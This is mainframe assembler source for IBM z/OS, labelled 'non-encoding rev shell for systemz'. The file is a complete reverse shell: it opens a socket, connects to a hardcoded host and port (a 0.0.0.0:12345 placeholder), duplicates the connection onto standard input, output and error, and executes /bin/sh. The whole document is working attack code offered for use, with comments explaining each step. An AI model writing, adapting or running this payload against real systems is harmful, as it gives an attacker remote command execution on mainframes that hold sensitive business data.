         TITLE  'non-encoding rev shell for systemz'
         AUTHOR 'Bigendian Smalls'
RSHLNT   CSECT  
RSHLNT   AMODE 31
RSHLNT   RMODE ANY
***********************************************************************
*                                                                     *
*        @SETUP registers and save areas                              *
*                                                                     *
***********************************************************************
@SETUP   DS    0F              # full word boundary
         STM   14,12,12(13)    # save our registers
         LARL  15,@SETUP       # base address into R15
         LR    8,15            # copy R15 to R8
         USING @SETUP,8        # R8 for addressability throughout
         LARL  11,SAVEAREA     # sa address
         ST    13,4(,11)       # save callers save area
         LR    13,11           # R13 to our save area
         DS    0H              # halfword boundaries

***********************************************************************
*                                                                     *
*        @LOADFS - load all the functions we need                     *
*          for SC loop this                                           *
*                                                                     *
***********************************************************************
@LOADFS  L     2,FFUNC         # first function we use
         LHI   3,8             # used for our index
         L     4,NUMFUNC       # number of functions to load
@LDLOOP  LR    0,2             # load string of func name
         XR    1,1             # clear R1
         SVC   8               # perform LOAD
         XC    0(8,2),0(2)     # clear current Func space
         ST    0,0(0,2)        # store addr in func space
         AR    2,3             # increment R2 by 8
         AHI   4,-1            # decrement R4
         CIB   4,0,2,@LDLOOP   # compare R4 with 0,if GT loop

***********************************************************************
*                                                                     *
*        BPX1SOC set up socket - inline                               *
*                                                                     *
***********************************************************************
LSOCK    L     15,BSOC         # load func addr to 15
         CALL  (15),(DOM,TYPE,PROTO,DIM,CLIFD,                         x
               RTN_VAL,RTN_COD,RSN_COD),VL
*******************************
*  chk return code, 0 or exit *
*******************************
         LHI   15,2
         L     6,RTN_VAL
         CIB   6,0,7,EXITP     # R6 not 0? Time to exit

***********************************************************************
*                                                                     *
*        BPX1CON (connect) connect to remote host - inline            *
*                                                                     *
***********************************************************************
LCONN    L     15,BCON                      # load func addr to 15
         LA    5,SRVSKT                     # addr of our socket
         USING SOCKADDR,5                   # layout sockaddr over R5
         XC    SOCKADDR(16),SOCKADDR        # zero sock addr struct
         MVI   SOCK_FAMILY,AF_INET          # family inet
         MVI   SOCK_LEN,SOCK#LEN            # len of socket
         MVC   SOCK_SIN_PORT,CONNSOCK       # port to connect to
         MVC   SOCK_SIN_ADDR,CONNADDR       # address to connect to
         DROP  5
         CALL  (15),(CLIFD,SOCKLEN,SRVSKT,                             x
               RTN_VAL,RTN_COD,RSN_COD),VL
*******************************
*  chk return code, 0 or exit *
*******************************
         LHI   15,3
         L     6,RTN_VAL
         CIB   6,0,7,EXITP     # R6 not 0? Time to exit

*************************************************
* order of things to prep child pid             *
*  0) Dupe all 3 file desc of CLIFD             *
*  1) dupe parent read fd to std input          *
*************************************************
         LA    2,F_DUPFD2      # gonna do a dup2
         L     5,CLIFD         # set clifd=stdin
         XR    6,6             # zero out R6 (stdin)
         BRAS  14,LFCNTL       # call dupe2
         LA    2,F_DUPFD2      # gonna do a dup2
         L     5,CLIFD         # set clifd=stdin
         LHI   6,1             # R6=stdout
         BRAS  14,LFCNTL       # call dupe2
         L     5,CLIFD         # set clifd=stdin
         LHI   6,2             # R6=stderr
         BRAS  14,LFCNTL       # call dupe2

***********************************************************************
*                                                                     *
*        BP1EXC  (EXEC) execute shell '/bin/sh'                       *
*                                                                     *
***********************************************************************
LEXEC    L     15,BEXC         # load func addr to 15
         CALL  (15),(EXCMDL,EXCMD,EXARGC,EXARGLL,EXARGL,               x
               EXENVC,EXENVLL,EXENVL,                                  x
               EXITRA,EXITPLA,                                         x
               RTN_VAL,RTN_COD,RSN_COD),VL
         BRAS  0,GOODEX        # exit child proc after exec

***********************************************************************
*                                                                     *
*        BPX1FCT (fcntl) edit file descriptor                         *
*           for dup2  set  R2=F_DUPFD2                                *
*           R5=fd to modify R6=fd to set R5 equal to                  *
*           equivalent to dupe2(R5,R6)                                *
*           for read flags, set R2=F_GETFL                            *
*           R5=fd, R6=0, R7=rtn flags                                 *
*           for write flags, set R2=F_SETFL                           *
*           R5=fd, R6=<new flags>  R7=0                               *
*           for  close, set R2=F_CLOSFD                               *
*           R5=R6 = fd to close (optionally R5 & R6 can be a range    *
*           of FDs to close)                                          *
*                                                                     *
***********************************************************************
LFCNTL   L     15,BFCT         # load func addr to 15
         ST    14,SAVEAREA     # save return address
         ST    5,@FFD          # fd to be duplicated
         ST    2,@ACT          # action field for BPX1FCT
         ST    6,@ARG          # r6 should have the biggest fd
         BRAS  0,@FCTL
@FFD     DC    F'0'
@ACT     DC    F'0'
@ARG     DC    F'0'
@RETFD   DC    F'0'
@FCTL    CALL  (15),(@FFD,@ACT,@ARG,@RETFD,RTN_COD,RSN_COD),VL
****************************************************
*  chk return code here anything but -1 is ok      *
****************************************************
         LHI   15,11           # exit code for this func
         L     7,@RETFD        # set r6 to rtn val
         CIB   7,-1,8,EXITP    # r6 = -1 exit
         L     14,SAVEAREA     # reload ret address
         BCR   15,14           # return to caller
         
****************************************************
* cleanup & exit                                   *
* preload R15 with exit code                       *
****************************************************
GOODEX   XR    15,15           # zero return code
EXITP    ST    15,0(,11)
         L     13,4(,11)
         LM    14,12,12(13)    # restore registers
         LARL  5,SAVEAREA
         L     15,0(0,5)
         BCR   15,14           # branch to caller

**********************
**********************
*                    *
* Constant Sections  *
*                    *
**********************
**********************
@CONST   DS    0F              # constants full word boundary 
SAVEAREA DC    X'00000000'
         DC    X'00000000'
ALET     DC    F'0'
*************************
* Function addresses    *       # pipe variables
*************************
FFUNC    DC    A(BSOC)          # address of first function
NUMFUNC  DC    F'5'             # number of funcs listed below
BSOC     DC    CL8'BPX1SOC '    # Socket
BBND     DC    CL8'BPX1BND '    # Bind
BCON     DC    CL8'BPX1CON '    # Connect 
BFCT     DC    CL8'BPX1FCT '    # Fcntl
BEXC     DC    CL8'BPX1EXC '    # Exec
*************************
* Socket conn variables *       # functions used by pgm
*************************
CONNSOCK DC    XL2'3039'        # port 12345
CONNADDR DC    XL4'00000000'    # address 0.0.0.0
BACKLOG  DC    F'1'             # 1 byte backlog
DOM      DC    A(AF_INET)         # AF_INET = 2
TYPE     DC    A(SOCK#_STREAM)    # stream = 1
PROTO    DC    A(IPPROTO_IP)      # ip = 0
DIM      DC    A(SOCK#DIM_SOCKET) # dim_sock = 1
SRVSKT   DC    16XL1'77'          # srv socket struct
SOCKLEN  DC    A(SOCK#LEN+SOCK_SIN#LEN)
CLILEN   DC    A(*)               # len of client struct
CLISKT   DC    16XL1'88'          # client socket struct
CLIFD    DC    A(*)               # client fd
************************
* BPX1EXC vars *********
************************
EXCMD    DC    CL7'/bin/sh'       # command to exec
EXCMDL   DC    A(L'EXCMD)         # len of cmd to exec
EXARGC   DC    F'1'               # num of arguments
EXARG1   DC    CL2'sh'            # arg 1 to exec
EXARG1L  DC    A(L'EXARG1)        # len of arg1
EXARGL   DC    A(EXARG1)          # addr of argument list
EXARGLL  DC    A(EXARG1L)         # addr of arg len list
EXENVC   DC    F'0'               # env var count
EXENVL   DC    F'0'               # env var arg list addr
EXENVLL  DC    F'0'               # env var arg len addr
EXITRA   DC    F'0'               # exit routine addr
EXITPLA  DC    F'0'               # exit rout parm list addr
*********************
* Return value vars *
*********************
RTN_VAL  DC    A(*)               # return value
RTN_COD  DC    A(*)               # return code
RSN_COD  DC    A(*)               # reason code
***************************
***** end of constants ****
***************************
         BPXYSOCK   LIST=YES         # MACRO MAP for socket structure
         BPXYFCTL   LIST=YES         # MACRO MAP for fcntl structure
         END   @SETUP
